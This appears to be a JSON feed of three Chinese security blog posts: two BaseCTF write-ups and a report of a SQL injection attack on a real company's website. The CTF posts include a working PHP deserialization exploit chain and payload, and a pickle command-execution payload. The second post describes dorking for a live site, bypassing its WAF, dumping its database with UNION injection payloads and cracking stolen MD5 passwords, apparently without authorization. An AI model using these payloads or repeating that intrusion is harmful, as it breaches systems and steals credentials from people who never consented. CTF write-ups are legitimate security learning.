Hacker(\u0026#39;{{{\u0026#39;.$_GET[\u0026#39;ez_ser.from_you\u0026#39;].\u0026#39;}}}\u0026#39;); if(preg_match(\u0026#34;/\\[|\\]/i\u0026#34;, $_GET[\u0026#39;substr\u0026#39;])){ die(\u0026#34;NONONO!!!\u0026#34;); } $pre = isset($_GET[\u0026#39;substr\u0026#39;])?$_GET[\u0026#39;substr\u0026#39;]:\u0026#34;substr\u0026#34;; $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); $a = unserialize($ser_ctf); throw new Exception(\u0026#34;杂鱼~杂鱼~\u0026#34;); } 首先便是构造pop利用链，这道题的是比较好构造的，有个以前不知道的知识点是__get方法中 如果你没有为 t 属性赋值，或者将其设置为 null，那么在调用 $this-\u0026gt;t-\u0026gt;t 时将会抛出一个错误，因为你尝试在一个 null 值上访问属性\n以前只知道访问不可访问属性和未定义成员变量可以触发，其实没赋值定义访问属性也能触发\n到Hacker类前这么构造即可\n1 2 3 4 5 6 7 8 9 10 $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; 然后Hacker类中绕过__wakeup方法，因为下面还有个赋值操作$this-\u0026gt;end = $this-\u0026gt;start，我们可以引用赋值来绕过\n1 2 $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; 到这利用链已经基本构造完了，注意源码中还有句throw new Exception(\u0026quot;杂鱼~杂鱼~\u0026quot;);抛出异常会导致__destruct析构方法无法执行从而导致反序列化过程失败\n绕过抛出异常就需要利用到PHP的GC垃圾回收机制，我举个例：本地开个php服务器执行以下代码进行测试\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;?php highlight_file(__FILE__); $flag = \u0026#34;flag{test_flag}\u0026#34;; class B { function __destruct() { global $flag; echo $flag; } } $a = unserialize($_GET[\u0026#39;ctf\u0026#39;]); throw new Exception(\u0026#39;nonono\u0026#39;); 构造一个payload\n传入后发现提前执行了析构方法echo $flag,利用成功\n生成payload后别忘了手动将键名2改为1，不能直接写两个1，这样会导致value直接变为null\n1 $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); 最后就是substrstr函数，看似返回中括号内容和下文一致没什么错误\n1 2 3 4 5 6 7 8 function substrstr($data) { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } --------------- --- $ser_ctf = substrstr($pre.\u0026#34;[\u0026#34;.serialize($ctf).\u0026#34;]\u0026#34;); 实际上生成的数据没有中括号而且前面还有三十八位无效数据影响反序列化\n本地尝试发现序列化数据被截取后是无法执行的\n关于mb_strpos和mb_substr的知识，\n1 2 3 4 5 6 每发送一个%f0abc，mb_strpos认为是4个字节，mb_substr认为是1个字节，相差3个字节 每发送一个%f0%9fab,mb_strpos认为是3个字节，mb_substr认为是1个字节，相差2个字节 每发送一个%f0%9f%9fa,mb_strpos认为是2个字节，mb_substr认为是1个字节，相差1个字节 unicode占4字节，mb_substr会将数据%f0abc中的ab拿去补全四字节，从而认为该数据只有c的一个字节 %f0%9fab这种则会保留最少一位b，所以又认为只有一字节 根据原先构造链输出我们需要的数据是不需要前面这38位的，可以利用以上知识利用字符串逃逸来截取掉这38位数据只留我们的payload\n最终exp，别忘了将生成数据键名改为1！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 $a = \u0026#34;%f0abc\u0026#34;; error_reporting(0); function substrstr($data)//提权中括号之间的内容 { $start = mb_strpos($data, \u0026#34;[\u0026#34;); $end = mb_strpos($data, \u0026#34;]\u0026#34;); return mb_substr($data, $start + 1, $end - 1 - $start); } class Hacker { public $start; public $end; public $username = \u0026#34;ctfer\u0026#34;; public function __wakeup() { $this-\u0026gt;username = \u0026#34;hacker\u0026#34;; $this-\u0026gt;end = $this-\u0026gt;start; } public function __destruct() { if (!preg_match(\u0026#39;/ctfer/i\u0026#39;, $this-\u0026gt;username)) { echo \u0026#39;Hacker！\u0026#39;; } } } class C { public $c; public function __toString() { $this-\u0026gt;c-\u0026gt;c(); return \u0026#34;C\u0026#34;; } } class T { public $t; public function __call($name, $args) { echo $this-\u0026gt;t-\u0026gt;t; } } class F { public $f; public function __get($name) { return isset($this-\u0026gt;f-\u0026gt;f); } } class E { public $e; public function __isset($name) { ($this-\u0026gt;e)(); } } class R { public $r; public function __invoke() { eval($this-\u0026gt;r); } } $s1 = new R(); $s1-\u0026gt;r = \u0026#34;system(\u0026#39;cat /flag\u0026#39;);\u0026#34;; $s2 = new E(); $s2-\u0026gt;e = $s1; $s3 = new F(); $s3-\u0026gt;f = $s2; $s4 = new T(); $s4-\u0026gt;t = $s3; $s5 = new C(); $s5-\u0026gt;c = $s4; $s6 = new Hacker(); $s6-\u0026gt;end = \u0026amp;$s6-\u0026gt;username; $s6-\u0026gt;start = $s5; $s7 = array(\u0026#39;1\u0026#39;=\u0026gt;$s6,\u0026#39;2\u0026#39;=\u0026gt;null); //echo serialize($s7).\u0026#34;\\n\u0026#34;; //echo urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; echo \u0026#34;?substr=\u0026#34;.str_repeat($a,12).\u0026#34;%f0%9fab\u0026amp;ez[ser.from_you=\u0026#34;.urlencode(serialize($s7)).\u0026#34;\\n\u0026#34;; payload\n1 %f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0abc%f0%9fab\u0026amp;ez[ser.from_you=a%3A2%3A%7Bi%3A1%3BO%3A6%3A%22Hacker%22%3A3%3A%7Bs%3A5%3A%22start%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A1%3A%22c%22%3BO%3A1%3A%22T%22%3A1%3A%7Bs%3A1%3A%22t%22%3BO%3A1%3A%22F%22%3A1%3A%7Bs%3A1%3A%22f%22%3BO%3A1%3A%22E%22%3A1%3A%7Bs%3A1%3A%22e%22%3BO%3A1%3A%22R%22%3A1%3A%7Bs%3A1%3A%22r%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7D%7D%7Ds%3A3%3A%22end%22%3Bs%3A5%3A%22ctfer%22%3Bs%3A8%3A%22username%22%3BR%3A9%3B%7Di%3A1%3BN%3B%7D solved!\n","date":"2024-09-12T17:26:54+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-web-wp/","title":"BaseCTF招新赛 Web-Wp"},{"content":"发现方式 利用goole语法inurl=\u0026quot;id=\u0026quot;发现某公司php站点，在id后输入1' and 'a'='a'--显示被waf拦截\n这个waf我去搜了一下是西数的一个waf，挺拉的\n经过尝试发现是空格被过滤了，于是将空格用+替换。输入1'+and+'a'='a'--后页面报错，说明存在sql注入漏洞\n基本信息 1 2 3 4 5 ?id=1+union+select+database()-- ?id=1+union+select+version()-- ?id=1+union+select+user()-- 成功查询到当前库名：sanying mysql版本：5.7.43 user：sanying@127.0.0.1 这个版本是好多年前的了，高版本的用法不能在这用\n查库 在构造的时候又发现这个waf规则里面group_concat不能和括号连用，所以我们只能用limit一条一条查\n构造payload\n?id=-1+union+select+schema_name+from+information_schema.schemata+limit+0,1--\n发现只有两个库，其中一个还是系统库(°ー°〃)\n看来只用脱sanying库就行了，系统库就不管了\n查表 构造payload\n?id=-1+union+select+table_name+from+information_schema.tables+where+table_schema=database()+limit+0,1--\n后面可以用用burp的攻击模块或者自己写个脚本提取，我选的后者。因为前者还要自己去把表名抄下来太麻烦，我根据页面回显利用python re库和正则将回显内容提取出来即可，最后发现有共17张表\n查列名 查列名的时候又发现不能指定数据库或者具体的表名来查，反正我们只脱一个库数据库名就可以一直用database(),表名就用子查询+limit n,1来指定，后续把n当作循环变量即可\n构造payload\n?id=-1+union+select+column_name+from+information_schema.columns+where+table_name=(select+table_name+from+information_schema.tables+where+table_schema=database()+limit+n,1)+and+table_schema=database()+limit+0,1--\n然后写入脚本自动化查询每张表的列名\n查数据 到这里了开始我是想尽办法构造出列名，结果最后发现可以直接指定列名来查，不知道为什么，这个waf给我人整麻了 ╮(╯▽╰)╭\n构造payload\n-1+union+select+{data[i]}+from+Sanying.{km}\n这里是从脚本里面复制出来的，我是先把列名处理成列表\n这里因为不太会协调这些数据的位置处理输出到xlsx，有些列还是空的，所以我只能半自动化手动填数据到excel，有大佬的话浇浇我！\n成果 最后就是这样，拿到了两个账号和一些信息，这库也是真的老了，十几年前的了，密码还是用的md5，但是最近又有人登录。后面利用hashcat和在线网站成功解出两个md5哈希，也算是稍有收获！\n免责声明： 目的：本文旨在分享有关网络安全渗透知识的信息，以促进对网络安全的理解和提高个人和组织的安全意识。这些知识和技术应仅用于合法的、授权的安全测试和红队操作，并遵守适用的法律和道德规范。\n法律合规：在参考本文所提供的渗透测试和攻击技术时，请确保遵守您所在国家或地区的法律法规。未经合法授权和明确许可，禁止使用这些知识和技术从事非法活动，如未经授权的入侵、数据盗取、破坏性攻击等。\n责任限制：使用本文所提供的信息和技术的过程中，如因操作不当或其他原因导致任何损失或损害，作者概不负责。使用者应自行承担所有风险和后果。\n免责声明：本文的分享仅为技术交流和学习之用，并不鼓励任何非法活动。作者不对任何个人或组织的非法行为承担任何责任。\n出事与作者无关：使用者在运用本文提供的知识和技术时，应自行判断和承担责任。如因使用者违反法律法规或滥用本文提供的知识和技术而导致任何问题、损失或法律责任，与作者无关。使用者应对其行为负完全责任。\n合法授权：在进行安全测试和渗透测试时，使用者应首先获得相关系统和网络的合法授权，确保测试的对象是属于您合法所有或得到明确授权的。\n持续学习：网络安全是一个不断发展和演变的领域，本文提供的知识和技术可能随时间而过时或失效。使用者应不断学习和更新知识，关注最新的安全趋势、漏洞和防护措施。\n通过阅读和使用本文提供的信息和技术，视为您理解并同意以上免责声明，并同意自行承担使用这些知识和技术所产生的风险和后果。作者对任何不当使用所导致的问题、损失或法律责任概不负责。\n","date":"2024-09-11T11:34:30+08:00","permalink":"http://gucheng.me/p/%E8%AE%B0%E4%B8%80%E6%AC%A1%E7%9C%9F%E5%AE%9E%E7%AB%99%E7%82%B9sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","title":"记一次真实站点sql注入漏洞"},{"content":" [!NOTE]\n这里我就只写一些有价值点的和我当时不会的题目的wp了\n[Week1] 捂住X只耳 下载音频后未发现频谱和音频波异常，听了下在音乐后半段有摩斯电码声音，所以我们需要将摩斯电码从音乐中分离出来以便识别\n先点击三个点分离立体声到单音道 点击左上角文件-\u0026gt;导出音频-\u0026gt;多个文件-\u0026gt;导出 成功导出两个wav\n打开Adobe Audition，左上角依次点击文件——新建——多轨会话——确定\n将刚才生成的两个wav拖入进多轨会话，然后双击未命名混音项目，再将两个wav拖入右边轨道\n双击一个轨道进入后上面工具栏点击——效果——反相 双击左侧未命名混音项目后点击左上角，选择导出，多轨混音，整个会话，选择导出位置后直接导出 将生成的mp3拖入audacity，点击三个点，频谱图。然后按住ctrl滑动滚轮放大可以看到明显的摩斯码，抄下来解密即可 [Week2] Base?! 这是一段xx-encode码，开始真没想到，随波逐流一把嗦即可\n[Week3] Base revenge 将以上文本base64隐写解密得到JnUaAFMFImgANSEuAWYuBE9SyaYpC2ldBrU9\n将hint一键解码发现是atbash加密\n因为编码器解出来大小写有问题直接用[cyberchef](Atbash Cipher - CyberChef)\n再base64解码即可\n[Week3] broken.mp4 这道题挺简单的，两个视频用untrunc工具修复即可\n[Week3] 外星信号 音频播放就有莫斯码，先丢[在线网站](Morse Code Adaptive Audio Decoder | Morse Code World)听一下,前半部分flag在这里面，要转换小写\n音频使用foremost提取出压缩包里面有另一个音频，一听就知道是sstv，sstv我只推荐使用[这个脚本](colaclanth/sstv: SSTV Decoder (github.com))，软件又拉又麻烦,下面是用法\n1 sstv -d flag.mp3 -o result.png 提取出摩斯码图片如下\n和前面半段flag组合转换小写即可\n[Week3] 这是一个压缩包 这道题利用archpr工具的掩码破解，花了我n小时，感觉脚本会更快\n[Week4] Webshell 这道题先用wireshark提取出rar压缩包，解压发现是一套WordPress程序，这种博客没啥上传点吧，ai回答\nWordPress作为一款广泛使用的内容管理系统（CMS），其安全性一直备受关注。关于WordPress中容易被上传webshell的文件路径，可以从以下几个方面进行归纳： 主题文件夹： 路径示例：/wp-content/themes/[主题名称]/ 说明：WordPress允许用户通过后台上传和安装主题。黑客可能会将恶意代码（如webshell）嵌入到自定义主题中，并通过上传主题的方式将其部署到目标网站上。一旦主题被安装，webshell就可以被用来执行恶意命令或操纵网站。 插件文件夹：\n虽然问题中主要询问的是关于webshell上传的文件路径，但值得注意的是，插件文件夹也是潜在的安全风险点。 路径示例：/wp-content/plugins/[插件名称]/ 说明：与主题类似，插件也是WordPress扩展功能的重要方式。黑客可能会利用漏洞或恶意插件来上传webshell，从而控制网站。 上传文件夹：\n路径示例：/wp-content/uploads/ 说明：这是WordPress默认的媒体文件上传目录。虽然直接在这个文件夹中上传webshell可能受到WordPress的限制，但黑客可能会通过绕过安全检查或将webshell与合法文件捆绑上传的方式来达到目的。 自定义上传目录：\n路径示例：根据用户设置而定（如/wp-content/uploads/custom-directory/） 说明：WordPress允许用户通过修改配置或安装特定插件来更改默认的上传目录。如果这些自定义目录的安全设置不当，就可能成为黑客上传webshell的潜在目标。\n然后再插件目录下确实发现了\n转字符串后发现读取ui.js文件的内容\n目录下搜索ui.js，解码后发现很像@eval($_POST[\u0026rsquo;\u0026rsquo;])这种，但是传webshell的都使用了自定义函数和各种函数加编码，还是相当有水平的\n连接密码提交不对？再回去一看原来还有层rot13，解密提交即可\n[Week4] 二维码2-阿喀琉斯之踵 这道题用CQR纠错是不行的，里面二维码被添加了东西格式不对，用这个[项目](QRazyBox - QR Code Analysis and Recovery Toolkit (merri.cx))可以尝试爆破所有格式\n从图片导入qrcode-2.png 点击右上角tools 先选择爆破格式模式，然后再点击最上面提取信息 over\n[Week4] 小cheny的社交 这道题，嗯\u0026hellip;会了后有点没啥讲的了，我大体说下过程\nstegsolve看到一串字符，base64解码后再转16进制ascii得到一个QQ\n搜索QQ在她空间发现尊嘟假嘟编码，用[](尊嘟假嘟O.o (zdjd.asia))解码得到前半flag，然后还有个视频到b站搜评论下@了一个人点进去看到另外一串密文\n看着很像链接，用随波逐流梭哈搜索https发现链接\n进入链接博客又发现尊嘟假嘟编码，这里解码得到后半flag[](尊嘟假嘟O.o (zdjd.asia))\nPickle Init [Week3] [Week4] 学习文章，我也不会opcode\nPickle反序列化 - 枫のBlog (goodapple.top)\n题目源码\n1 2 3 #!/bin/bash echo \u0026#34;${GZCTF_FLAG}\u0026#34; \u0026gt; /flag python3 -c \u0026#34;__import__(\u0026#39;pickle\u0026#39;).loads(__import__(\u0026#39;sys\u0026#39;).stdin.read(50).encode(\u0026#39;ASCII\u0026#39;))\u0026#34; 贴个脚本，用pwntools发的，不然不好填50字节\n1 2 3 4 5 6 7 8 9 10 11 r1 = b\u0026#34;\u0026#34;\u0026#34;cos system (S\u0026#39;cat flag\u0026#39; tR.\u0026#34;\u0026#34;\u0026#34; from pwn import * s = remote(\u0026#39;challenge.basectf.fun\u0026#39;,41751) payload = r1.ljust(50,b\u0026#39;0\u0026#39;)\t#从左边填充0 s.sendline(payload) s.interactive() ","date":"2024-09-10T15:25:42+08:00","permalink":"http://gucheng.me/p/basectf%E6%8B%9B%E6%96%B0%E8%B5%9B-misc-wp/","title":"BaseCTF招新赛-Misc-wp"}]